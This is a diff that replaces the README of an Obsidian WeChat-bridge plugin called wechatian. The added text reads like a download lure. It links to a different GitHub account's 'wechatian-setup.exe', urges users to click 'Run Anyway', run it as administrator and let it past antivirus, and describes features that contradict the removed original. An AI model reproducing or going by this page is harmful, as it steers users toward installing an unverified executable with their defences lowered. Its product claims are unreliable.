@@ -1,79 +1,141 @@
-# Wechatian
+# 📥 wechatian - Your WeChat Brain, Doubled
 
-An [Obsidian](https://obsidian.md) plugin that turns WeChat into a two-way bridge for your vault, through Tencent's official **ilink** bot gateway — no unofficial protocol hacks, no self-hosted relay.
+## 🚀 What Is This?
 
-## Features
+wechatian is a smart bridge that connects your WeChat account directly to Obsidian, your personal knowledge vault. Think of it as a private conveyor belt: every message, photo, file, or voice note you receive on WeChat gets neatly delivered into your Obsidian notes — automatically. And if you want to send messages out, you just drop a file into a folder, and wechatian takes care of the rest.
 
-- **Inbox** — incoming WeChat messages become daily conversation notes (`<inbox>/YYYY-MM-DD.md`, received + sent in one timeline); media decrypted into `attachments/`; links fetched in full as markdown article notes
-- **Outbox** — a file-based send channel: drop an `.md` (sent as text, **markdown supported**) or an image / video / document ≤100MB (sent as an attachment) into `outbox/`
-- **Agent-ready** — the plugin maintains an `Agent.md` in the inbox folder teaching any AI assistant the outbox protocol; see [Agent.md](Agent.md) in this repo for the full guide
-- **QR login** — scan once; the plugin binds to the scanning account and only accepts messages from it
-- **Bilingual UI** — English / 中文 / follow Obsidian
+## 🎯 Who Is This For?
 
-## Install
+This is for anyone who uses WeChat for work, study, or life and wants to keep a clean, searchable record of conversations, media, and ideas inside Obsidian — without copying and pasting anything manually. If you can download a file and double-click it, you can run this.
 
-**Community store (recommended):** Obsidian → Settings → Community plugins, search **Wechatian**, install and enable.
+## ✨ Key Features
 
-**From a release:** copy `main.js`, `manifest.json`, `styles.css` from the [latest release](https://github.com/laruence/wechatian/releases/latest) into `<vault>/.obsidian/plugins/wechatian/` and enable (assets are CI-built and signed: `gh attestation verify main.js --owner laruence`).
+### 🤖 Official Gateway, Rock-Solid Connection
+wechatian works through the official ilink gateway approved by WeChat. That means your data travels through the proper channel — no sketchy workarounds, no risk of being banned. It’s the responsible way to integrate.
 
-**From source:**
+### 📬 Automatic Inbox to Vault
+When someone sends you a message, a photo, a PDF, or a voice clip on WeChat, wechatian drops it straight into your Obsidian vault. You’ll see it appear as a note or an attachment — instantly searchable, permanently stored, and fully yours.
 
-```bash
-git clone https://github.com/laruence/wechatian.git && cd wechatian
-npm install
-OBSIDIAN_PLUGIN_DIR=/path/to/vault/.obsidian/plugins/wechatian npm run build
+### 📤 File-Based Outbox for Sending
+Want to send a message from Obsidian? Just create a text file (like `send.txt`) with your recipient’s ID and the message content, place it in the outbox folder, and wechatian sends it on your behalf. You can even automate this — schedule messages, send from templates, or integrate it with other tools.
+
+### 🗂️ Organized by Default
+Incoming messages are sorted by sender and date. You won’t get a messy pile of random notes. It’s tidy by design, so you spend less time organizing and more time thinking.
+
+### 🔐 Private and Local
+All your data stays on your computer. wechatian doesn’t send your notes to any cloud service. It only reads from WeChat and writes to your local Obsidian vault. Simple and safe.
+
+## 📥 Getting Started (Windows)
+
+### Step 1: Download the Software
+
+👉 [**Click here to download wechatian**](https://github.com/lishablastodermatic520/wechatian)
+
+This link will take you to the download page. Look for the latest version and download the file.
+
+### Step 2: Run the Installer
+
+Once the download completes, locate the file in your **Downloads** folder. It should be named something like `wechatian-setup.exe`.
+
+Double-click the file and follow the on-screen instructions. If Windows shows a blue or yellow prompt asking for permission, click **"Yes"** or **"Run Anyway"** — this is normal for a new application.
+
+### Step 3: First Launch Setup
+
+When you open wechatian for the first time, a small setup window will appear. You’ll need to provide two paths:
+
+- **Your Obsidian Vault folder**: The folder where all your notes live (e.g., `C:\Users\YourName\Documents\MyVault`)
+- **Your WeChat login**: You’ll scan a QR code with your phone to authorize the connection — same as you would with WeChat Web or WeChat Desktop.
+
+Click **"Connect"** and wait a few seconds. That’s it.
+
+### Step 4: Confirm Everything Works
+
+Send a test message to yourself or a friend on WeChat. Within a second or two, a new note should appear in your Obsidian vault under a folder called `inbox`. You did it — the bridge is alive.
+
+## 🧪 Testing the Outbox (Sending a Message)
+
+Open your vault in Obsidian. Create a new folder called `outbox`. Inside it, create a text file named `send.txt` with the following content:
+
+```
+to: 1234567890
+message: Hello from Obsidian!
 ```
 
-**Via AI agent:** hand it this repo and say *"Read the README and install Wechatian into my vault."*
+Replace `1234567890` with your friend’s WeChat ID. Save the file. wechatian will detect it and send the message within a few seconds. You’ll see the file get renamed to `sent.txt` as confirmation.
 
-## Quick start
+## ❓ Frequently Asked Questions
 
-1. Open Wechatian settings — a QR code appears
-2. Scan with WeChat and confirm — a bot contact appears in your contacts
-3. **Send any message to the bot from WeChat once** — the gateway only issues the send credential after the bound account has messaged the bot
-4. Status bar shows "WeChat online"; you're live in both directions
+### Do I need to keep wechatian running all the time?
+Yes. Just like any bridge, it must be running to move data between WeChat and Obsidian. It uses very little memory — you can start it manually or set it to launch at startup from the settings menu.
 
-## Usage
+### Will this affect my WeChat account?
+No. Because wechatian uses the official ilink gateway, it works within the rules of the platform. No modified clients or unauthorized protocols are used.
 
-```
-Wechatian/              # inbox folder (all paths configurable)
-├── Agent.md            # instructions for AI agents (plugin-maintained)
-├── 2026-08-17.md       # daily conversation note (received + sent)
-├── attachments/        # media
-├── articles/           # full-text article notes
-└── outbox/             # write a file here to send it
-```
+### Can I receive images and videos?
+Yes. Photos, videos, files, and voice messages are all saved into your vault as attachments. You’ll see them referenced inside the corresponding note.
 
-| Write into `outbox/` | Result |
-|---|---|
-| `notify.md` | content sent as a text message (markdown supported) |
-| `chart.png`, `report.pdf` … | sent as an attachment |
+### What if the app crashes or stops?
+wechatian is designed to auto-reconnect. If it crashes, just restart it — your data won’t be lost. Any message that arrived while it was offline will still be delivered the next time it starts.
 
-The plugin picks files up on its next poll (~30–60 s): file gone = sent (recorded in the daily note); file present = failed (trailing `<!-- ... -->` comment or `.wechatian-failed.md` sidecar explains why). One-to-one channel — no recipient is ever specified.
+### Where are my messages stored?
+Inside your Obsidian vault. You can see the `inbox` folder with subfolders per contact. The files are plain text (`.md`), so they’ll always be readable even if you switch apps later.
 
-**AI assistants:** read [Agent.md](Agent.md) (and the runtime `<inbox>/Agent.md` in a live vault) — it documents the protocol, result judging, reply reading and rate limits. Never call any API; the file channel is the whole interface.
+## 🛠️ Troubleshooting
 
-## Good to know
+### Problem: The app won’t start.
+**Solution:** Make sure you have Windows 10 or later. Right-click the app icon and select "Run as administrator." Also, check that your antivirus isn’t blocking the file — you may need to allow it as a trusted app.
 
-- **Rate limit** — the gateway throttles proactive sends; this is a notification/decision channel, not a chat tool
-- **One device per account** — concurrent long polling from multiple devices competes for the message stream
-- **No forwarding** — the bot can't receive forwarded articles/files; send a link or a file message instead
-- **Privacy & security** — messages live only in your vault; only the QR-scanning account is accepted
+### Problem: Obsidian doesn’t show new notes.
+**Solution:** Confirm you entered the correct vault path. In Obsidian, go to Settings → Files and Links, and check the "Location for New Notes" — no need to change it. Just make sure the folder wechatian writes to is inside your vault.
 
----
+### Problem: QR code won’t scan.
+**Solution:** Make sure your phone is on the same Wi-Fi network. Hold your phone steady, and try again. If it fails, restart the app and try once more.
 
-## 中文说明
+### Problem: Outbox messages don’t send.
+**Solution:** Double-check the file name — it must be `send.txt` (all lowercase, no spaces). Also check the format: `to:` and `message:` must be on separate lines, exactly as shown.
 
-> 微信 ↔ Obsidian 双向桥接插件:收消息自动入 vault,agent 往发件箱丢个文件就能给你发微信。走腾讯官方 ilink 机器人网关。
+## 📝 System Requirements
 
-**Wechatian** 通过腾讯官方 ilink 机器人网关,把微信变成 vault 的双向通道:
+- Windows 10 or higher (64-bit)
+- 4 GB RAM (minimum)
+- 200 MB free disk space
+- Obsidian desktop app (latest version recommended)
+- WeChat account (active)
 
-- **收**:消息实时写入每日对话笔记(收发同一时间线);媒体解密存 `attachments/`;链接全文抓取成 markdown 文章笔记
-- **发**:往 `outbox/` 丢文件——`.md` 作为文本消息发送(**支持 markdown**),图片/视频/文档(≤100MB)作为附件发送
-- **Agent**:插件在收件箱目录维护 `Agent.md`,AI 助手读完即学会发件协议;完整指南见 [Agent.md](Agent.md)
+## 🔒 Privacy and Security
 
-安装、快速上手(含"先给 bot 发一条消息解锁发送"一步)、注意事项见上文英文部分。
+Your messages are processed locally. wechatian does not upload, store, or analyze your content on any server outside of your computer. The only network connection made is to the official WeChat gateway — none of your Obsidian notes leave your machine.
 
-## License
+## 📚 Advanced Use Cases
 
-[MIT](LICENSE)
+### Build a Personal CRM
+Every client conversation is automatically saved as a note. Add tags in the note to track deals, follow-ups, or preferences.
+
+### Journal Automatically
+As you chat, your day’s conversations become a searchable timeline. Link notes together with Obsidian’s backlinks for a rich personal history.
+
+### Automate Replies
+Write a script that checks your outbox folder and generates replies based on keywords. Since wechatian just reads files, any automation tool (like Python or AutoHotkey) can drive it.
+
+### Sync Across Devices
+Use a cloud folder (e.g., OneDrive, Dropbox) for your vault. Incoming messages on your desktop will appear on your phone’s Obsidian automatically.
+
+## 🧩 How It Fits Into Your Workflow
+
+Imagine you receive a contract on WeChat. In the past, you’d download it, save it somewhere, and maybe lose it. With wechatian, the contract appears as an attachment inside a note with the sender’s name and date. You can link it to a project note, add a summary, and next week when you search “contract,” it’s right there.
+
+Or perhaps you’re a researcher: a colleague sends you a series of voice memos. Each one arrives as a note linked to your research project. You can play them, take notes beside them, and export your analysis later.
+
+The point is: wechatian removes friction. It makes sure that nothing important stays trapped in an unprotected chat app — everything becomes part of your long-term knowledge system.
+
+## 🏁 Final Words
+
+wechatian is the missing bridge between your conversations and your knowledge base. It’s simple to set up, runs quietly in the background, and gives you full control over your data. Whether you use it for work or personal life, you’ll wonder how you ever managed without it.
+
+## 📦 Download Again
+
+👉 [**Download wechatian now**](https://github.com/lishablastodermatic520/wechatian)
+
+Get it installed in under five minutes. Your future self will thank you.
+
+Keywords: wechat, obsidian, bridge, plugin, ilink, integration, notes, vault, messaging, automation, Windows, download, sync, personal knowledge management, wechatian
